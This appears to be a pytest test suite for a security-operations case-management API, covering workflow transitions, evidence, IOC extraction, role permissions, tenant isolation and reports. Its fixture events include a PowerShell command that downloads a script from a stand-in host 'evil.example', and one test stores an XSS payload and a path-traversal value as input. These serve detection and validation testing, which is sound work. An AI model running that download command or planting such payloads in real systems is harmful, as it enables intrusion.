import uuid

import pytest

from app.auth.rbac import Role
from app.cases import workflow
from tests.helpers import ev

C = "/api/v1/cases"


# ---- workflow unit tests -----------------------------------------------------------------------------
def test_every_status_has_transitions_and_targets_are_valid():
    assert set(workflow.TRANSITIONS) == set(workflow.STATUSES)
    for src, targets in workflow.TRANSITIONS.items():
        assert targets <= set(workflow.STATUSES) - {src}


@pytest.mark.parametrize(
    "src,dst,ok",
    [
        ("OPEN", "INVESTIGATING", True),
        ("OPEN", "CONTAINED", False),
        ("OPEN", "RESOLVED", False),
        ("INVESTIGATING", "CONTAINED", True),
        ("CONTAINED", "RESOLVED", True),
        ("RESOLVED", "CLOSED", True),
        ("CLOSED", "OPEN", False),
        ("CLOSED", "INVESTIGATING", True),
        ("FALSE_POSITIVE", "CLOSED", True),
        ("RESOLVED", "OPEN", False),
        ("OPEN", "OPEN", False),
    ],
)
def test_transition_matrix(src, dst, ok):
    if ok:
        workflow.check_transition(src, dst, "because")
    else:
        with pytest.raises(workflow.InvalidTransition):
            workflow.check_transition(src, dst, "because")


def test_resolution_comment_required():
    for dst, src in [("RESOLVED", "CONTAINED"), ("FALSE_POSITIVE", "OPEN"), ("CLOSED", "RESOLVED")]:
        with pytest.raises(workflow.InvalidTransition):
            workflow.check_transition(src, dst, "  ")
    with pytest.raises(workflow.InvalidTransition):
        workflow.check_transition("CLOSED", "INVESTIGATING", "")
    workflow.check_transition("OPEN", "INVESTIGATING", "")


# ---- API ---------------------------------------------------------------------------------------------
async def _seed_events(make, tenant):
    await make.index(
        tenant,
        [
            ev(
                5,
                event_type="process_creation",
                host={"hostname": "WS-01", "ip": ["10.0.0.5"]},
                user={"name": "alice"},
                process={
                    "name": "powershell.exe",
                    "pid": 10,
                    "command_line": "powershell iwr http://evil.example/p.ps1",
                    "hash": {"sha256": "a" * 64},
                    "parent": {"name": "WINWORD.EXE", "pid": 5},
                },
            ),
            ev(
                4,
                event_type="network_connection",
                host={"hostname": "WS-01"},
                user={"name": "alice"},
                process={"name": "powershell.exe", "pid": 10},
                network={"dst_ip": "203.0.113.45", "dst_port": 443},
            ),
        ],
    )


async def _event_ids(client, h):
    return [x["id"] for x in (await client.post("/api/v1/events/search", headers=h, json={})).json()["hits"]]


async def test_case_create_numbering_and_listing(client, make):
    t = await make.tenant()
    u, h = await make.login_as(t, Role.INCIDENT_RESPONDER)
    a = (await client.post(C, headers=h, json={"title": "Phish", "severity": "HIGH", "priority": "P1"})).json()
    b = (await client.post(C, headers=h, json={"title": "Other"})).json()
    assert (a["case_id"], b["case_id"]) == ("CASE-0001", "CASE-0002")
    assert a["status"] == "OPEN" and a["allowed_transitions"] == ["CLOSED", "FALSE_POSITIVE", "INVESTIGATING"]
    other = await make.tenant()
    _, ho = await make.login_as(other, Role.INCIDENT_RESPONDER)
    assert (await client.post(C, headers=ho, json={"title": "x"})).json()[
        "case_id"
    ] == "CASE-0001"  # per-tenant counter
    listing = (await client.get(C, headers=h, params={"q": "phi"})).json()
    assert [c["title"] for c in listing] == ["Phish"]
    assert [c["title"] for c in (await client.get(C, headers=h, params={"severity": "HIGH"})).json()] == ["Phish"]
    assert (await client.get(C, headers=h, params={"q": "%"})).json() == []  # LIKE wildcards are escaped


async def test_workflow_via_api_and_journal(client, make):
    t = await make.tenant()
    u, h = await make.login_as(t, Role.SOC_ANALYST)
    case = (await client.post(C, headers=h, json={"title": "T"})).json()
    cid = case["id"]

    def post(to, comment=""):
        return client.post(f"{C}/{cid}/transition", headers=h, json={"status": to, "comment": comment})  # noqa: E731

    assert (await post("RESOLVED")).status_code == 409
    assert (await post("INVESTIGATING")).json()["status"] == "INVESTIGATING"
    assert (await post("CONTAINED", "isolated host")).json()["status"] == "CONTAINED"
    assert (await post("RESOLVED")).status_code == 409  # needs resolution text
    r = (await post("RESOLVED", "reimaged")).json()
    assert r["resolution"] == "reimaged"
    closed = (await post("CLOSED", "done")).json()
    assert closed["closed_at"] is not None
    assert (await client.patch(f"{C}/{cid}", headers=h, json={"title": "edit"})).status_code == 409  # locked
    assert (
        await client.post(f"{C}/{cid}/iocs", headers=h, json={"type": "ip", "value": "203.0.113.1"})
    ).status_code == 409
    assert (await post("INVESTIGATING")).status_code == 409  # reopen needs a comment
    assert (await post("INVESTIGATING", "new evidence")).json()["closed_at"] is None
    kinds = [a["kind"] for a in (await client.get(f"{C}/{cid}/activity", headers=h)).json()]
    assert kinds.count("status_change") == 5 and kinds[0] == "created"


async def test_evidence_populates_iocs_assets_and_timeline(client, make):
    t = await make.tenant()
    _, h = await make.login_as(t, Role.SOC_ANALYST)
    await _seed_events(make, t)
    ids = await _event_ids(client, h)
    case = (await client.post(C, headers=h, json={"title": "PS", "event_ids": ids})).json()
    cid = case["id"]
    assert case["evidence_count"] == 2 and case["asset_count"] >= 2 and case["ioc_count"] >= 3
    iocs = {(i["type"], i["value"]): i for i in (await client.get(f"{C}/{cid}/iocs", headers=h)).json()}
    assert ("ip", "203.0.113.45") in iocs and ("sha256", "a" * 64) in iocs and ("domain", "evil.example") in iocs
    assets = {(a["type"], a["key"]) for a in (await client.get(f"{C}/{cid}/assets", headers=h)).json()}
    assert {("host", "ws-01"), ("user", "alice"), ("ip", "10.0.0.5")} <= assets
    ev_list = (await client.get(f"{C}/{cid}/evidence", headers=h)).json()
    assert {e["summary"] for e in ev_list} >= {"powershell.exe started by WINWORD.EXE"}
    tl = (await client.get(f"{C}/{cid}/timeline", headers=h)).json()
    assert len(tl["entries"]) == 2
    net = next(e for e in tl["entries"] if e["event_type"] == "network_connection")
    assert net["process_event_id"] is None or net["process_event_id"]  # lineage resolved when creator present
    # adding the same evidence again is idempotent
    again = await client.post(f"{C}/{cid}/evidence", headers=h, json={"event_ids": ids})
    assert again.status_code == 201 and again.json() == []
    assert (await client.get(f"{C}/{cid}", headers=h)).json()["evidence_count"] == 2


async def test_evidence_rejects_foreign_and_unknown_events(client, make):
    a, b = await make.tenant(), await make.tenant()
    await _seed_events(make, a)
    await _seed_events(make, b)
    _, ha = await make.login_as(a, Role.SOC_ANALYST)
    _, hb = await make.login_as(b, Role.SOC_ANALYST)
    foreign = await _event_ids(client, hb)
    case = (await client.post(C, headers=ha, json={"title": "x"})).json()
    r = await client.post(f"{C}/{case['id']}/evidence", headers=ha, json={"event_ids": foreign[:1]})
    assert r.status_code == 400
    assert (await client.post(C, headers=ha, json={"title": "y", "event_ids": ["a" * 32]})).status_code == 400
    assert (
        await client.post(f"{C}/{case['id']}/evidence", headers=ha, json={"event_ids": ["../x"]})
    ).status_code == 422


async def test_snapshot_survives_telemetry_deletion(client, make, app):
    from datetime import UTC, datetime, timedelta

    t = await make.tenant()
    _, h = await make.login_as(t, Role.SOC_ANALYST)
    await _seed_events(make, t)
    case = (await client.post(C, headers=h, json={"title": "keep", "event_ids": await _event_ids(client, h)})).json()
    await app.state.search.delete_before(t.id, (datetime.now(UTC) + timedelta(days=1)).isoformat())
    assert (await client.post("/api/v1/events/search", headers=h, json={})).json()["total"] == 0
    assert len((await client.get(f"{C}/{case['id']}/timeline", headers=h)).json()["entries"]) == 2
    assert len((await client.get(f"{C}/{case['id']}/evidence", headers=h)).json()) == 2


async def test_manual_iocs_and_extraction(client, make):
    t = await make.tenant()
    _, h = await make.login_as(t, Role.SOC_ANALYST)
    cid = (await client.post(C, headers=h, json={"title": "x"})).json()["id"]
    ok = await client.post(f"{C}/{cid}/iocs", headers=h, json={"type": "domain", "value": "Bad.Example"})
    assert ok.status_code == 201 and ok.json()["value"] == "bad.example" and ok.json()["source"] == "manual"
    assert (
        await client.post(f"{C}/{cid}/iocs", headers=h, json={"type": "domain", "value": "bad.example"})
    ).status_code == 409
    for bad in [("ip", "300.1.1.1"), ("sha256", "xyz"), ("url", "ftp://x"), ("domain", "a b")]:
        assert (
            await client.post(f"{C}/{cid}/iocs", headers=h, json={"type": bad[0], "value": bad[1]})
        ).status_code == 400
    await _seed_events(make, t)
    await client.post(f"{C}/{cid}/evidence", headers=h, json={"event_ids": await _event_ids(client, h)})
    assert (await client.post(f"{C}/{cid}/iocs/extract", headers=h)).json()["extracted"] >= 3
    values = {i["value"] for i in (await client.get(f"{C}/{cid}/iocs", headers=h)).json()}
    assert "bad.example" in values  # manual IOC survives re-extraction


async def test_assignee_rules(client, make):
    t, other = await make.tenant(), await make.tenant()
    _, h = await make.login_as(t, Role.TENANT_ADMIN)
    analyst, _ = await make.login_as(t, Role.SOC_ANALYST)
    viewer, _ = await make.login_as(t, Role.VIEWER)
    foreign, _ = await make.login_as(other, Role.SOC_ANALYST)
    for bad in (viewer, foreign):
        assert (await client.post(C, headers=h, json={"title": "x", "assignee_id": str(bad.id)})).status_code == 400
    case = (await client.post(C, headers=h, json={"title": "x", "assignee_id": str(analyst.id)})).json()
    assert case["assignee"]["email"] == analyst.email
    assert (await client.get(C, headers=h, params={"assignee_id": str(analyst.id)})).json()[0]["id"] == case["id"]
    un = await client.patch(f"{C}/{case['id']}", headers=h, json={"unassign": True})
    assert un.json()["assignee"] is None


@pytest.mark.parametrize(
    "role,write",
    [
        (Role.VIEWER, False),
        (Role.SOC_ANALYST, True),
        (Role.THREAT_HUNTER, True),
        (Role.INCIDENT_RESPONDER, True),
        (Role.TENANT_ADMIN, True),
    ],
)
async def test_case_permissions(client, make, role, write):
    t = await make.tenant()
    _, admin = await make.login_as(t, Role.TENANT_ADMIN)
    cid = (await client.post(C, headers=admin, json={"title": "x"})).json()["id"]
    _, h = await make.login_as(t, role)
    assert (await client.get(f"{C}/{cid}", headers=h)).status_code == 200
    expect = 201 if write else 403
    assert (await client.post(C, headers=h, json={"title": "n"})).status_code == expect
    assert (await client.post(f"{C}/{cid}/notes", headers=h, json={"body": "n"})).status_code == expect
    assert (
        await client.post(f"{C}/{cid}/iocs", headers=h, json={"type": "ip", "value": "203.0.113.3"})
    ).status_code == expect
    assert (await client.post(f"{C}/{cid}/transition", headers=h, json={"status": "INVESTIGATING"})).status_code == (
        200 if write else 403
    )
    assert (await client.post(f"{C}/{cid}/reports", headers=h)).status_code == expect
    assert (await client.get(f"{C}/{cid}/audit", headers=h)).status_code == (200 if role is Role.TENANT_ADMIN else 403)


async def test_cases_are_tenant_isolated(client, make):
    a, b = await make.tenant(), await make.tenant()
    await _seed_events(make, a)
    _, ha = await make.login_as(a, Role.TENANT_ADMIN)
    _, hb = await make.login_as(b, Role.TENANT_ADMIN)
    cid = (
        await client.post(C, headers=ha, json={"title": "secret", "event_ids": await _event_ids(client, ha)})
    ).json()["id"]
    assert (await client.get(C, headers=hb)).json() == []
    ev_id = (await client.get(f"{C}/{cid}/evidence", headers=ha)).json()[0]["id"]
    ioc_id = (await client.get(f"{C}/{cid}/iocs", headers=ha)).json()[0]["id"]
    asset_id = (await client.get(f"{C}/{cid}/assets", headers=ha)).json()[0]["id"]
    for method, url, body in [
        ("get", f"{C}/{cid}", None),
        ("patch", f"{C}/{cid}", {"title": "pwn"}),
        ("post", f"{C}/{cid}/transition", {"status": "INVESTIGATING"}),
        ("post", f"{C}/{cid}/notes", {"body": "x"}),
        ("get", f"{C}/{cid}/activity", None),
        ("get", f"{C}/{cid}/evidence", None),
        ("delete", f"{C}/{cid}/evidence/{ev_id}", None),
        ("get", f"{C}/{cid}/iocs", None),
        ("delete", f"{C}/{cid}/iocs/{ioc_id}", None),
        ("post", f"{C}/{cid}/iocs/extract", None),
        ("get", f"{C}/{cid}/assets", None),
        ("post", f"{C}/{cid}/assets", {"asset_id": asset_id}),
        ("delete", f"{C}/{cid}/assets/{asset_id}", None),
        ("get", f"{C}/{cid}/timeline", None),
        ("post", f"{C}/{cid}/reports", None),
        ("get", f"{C}/{cid}/reports", None),
        ("get", f"{C}/{cid}/audit", None),
    ]:
        kw = {"json": body} if body is not None else {}
        r = await getattr(client, method)(url, headers=hb, **kw)
        assert r.status_code == 404, (method, url, r.status_code)
    # B cannot link A's asset into B's own case either
    bcase = (await client.post(C, headers=hb, json={"title": "mine"})).json()["id"]
    assert (await client.post(f"{C}/{bcase}/assets", headers=hb, json={"asset_id": asset_id})).status_code == 404
    assert (await client.get(f"{C}/{cid}", headers=ha)).json()["title"] == "secret"


async def test_promote_hunt_finding_to_case(client, make):
    t, other = await make.tenant(), await make.tenant()
    _, h = await make.login_as(t, Role.THREAT_HUNTER)
    _, ho = await make.login_as(other, Role.THREAT_HUNTER)
    await _seed_events(make, t)
    ids = await _event_ids(client, h)
    hunt = (await client.post("/api/v1/hunts", headers=h, json={"title": "H"})).json()
    finding = (
        await client.post(f"/api/v1/hunts/{hunt['id']}/findings", headers=h, json={"title": "F", "event_ids": ids})
    ).json()
    case = (await client.post(C, headers=h, json={"title": "From finding", "finding_id": finding["id"]})).json()
    assert case["hunt_id"] == hunt["id"] and case["evidence_count"] == 2
    assert (await client.post(C, headers=ho, json={"title": "steal", "finding_id": finding["id"]})).status_code == 404
    assert (await client.post(C, headers=ho, json={"title": "steal", "hunt_id": hunt["id"]})).status_code == 404


async def test_report_is_versioned_escaped_and_complete(client, make):
    t = await make.tenant()
    _, h = await make.login_as(t, Role.TENANT_ADMIN)
    await _seed_events(make, t)
    case = (
        await client.post(
            C,
            headers=h,
            json={"title": "Report | test\nINJECT", "description": "desc", "event_ids": await _event_ids(client, h)},
        )
    ).json()
    r1 = (await client.post(f"{C}/{case['id']}/reports", headers=h)).json()
    r2 = (await client.post(f"{C}/{case['id']}/reports", headers=h)).json()
    assert (r1["version"], r2["version"]) == (1, 2)
    md = r2["content"]
    for needle in [
        "CASE-0001",
        "203.0.113.45",
        "powershell.exe started by WINWORD.EXE",
        "ws-01",
        "Timeline (derived from telemetry)",
    ]:
        assert needle in md, needle
    assert "Report \\| test INJECT" in md and "\nINJECT" not in md.split("\n")[0]
    assert [x["version"] for x in (await client.get(f"{C}/{case['id']}/reports", headers=h)).json()] == [2, 1]


async def test_case_audit_trail_and_tenant_audit_endpoint(client, make):
    t, other = await make.tenant(), await make.tenant()
    admin, h = await make.login_as(t, Role.TENANT_ADMIN)
    _, ho = await make.login_as(other, Role.TENANT_ADMIN)
    cid = (await client.post(C, headers=h, json={"title": "x"})).json()["id"]
    await client.post(f"{C}/{cid}/transition", headers=h, json={"status": "INVESTIGATING"})
    trail = (await client.get(f"{C}/{cid}/audit", headers=h)).json()
    assert {x["action"] for x in trail} >= {"case.create", "case.transition"}
    mine = (await client.get("/api/v1/audit", headers=h, params={"action": "case."})).json()
    assert mine and all(x["action"].startswith("case.") for x in mine)
    assert (await client.get("/api/v1/audit", headers=ho, params={"action": "case."})).json() == []
    _, analyst = await make.login_as(t, Role.SOC_ANALYST)
    assert (await client.get("/api/v1/audit", headers=analyst)).status_code == 403
    assert (await client.get("/api/v1/audit", headers=h, params={"limit": 100000})).status_code == 200


async def test_notes_are_plain_text_and_validated(client, make):
    t = await make.tenant()
    _, h = await make.login_as(t, Role.SOC_ANALYST)
    cid = (await client.post(C, headers=h, json={"title": "x"})).json()["id"]
    n = (await client.post(f"{C}/{cid}/notes", headers=h, json={"body": "<img src=x onerror=alert(1)>"})).json()
    assert n["kind"] == "note" and n["body"] == "<img src=x onerror=alert(1)>" and n["actor_email"]
    assert (await client.post(f"{C}/{cid}/notes", headers=h, json={"body": ""})).status_code == 422
    assert (await client.post(C, headers=h, json={"title": "x", "tenant_id": str(uuid.uuid4())})).status_code == 422
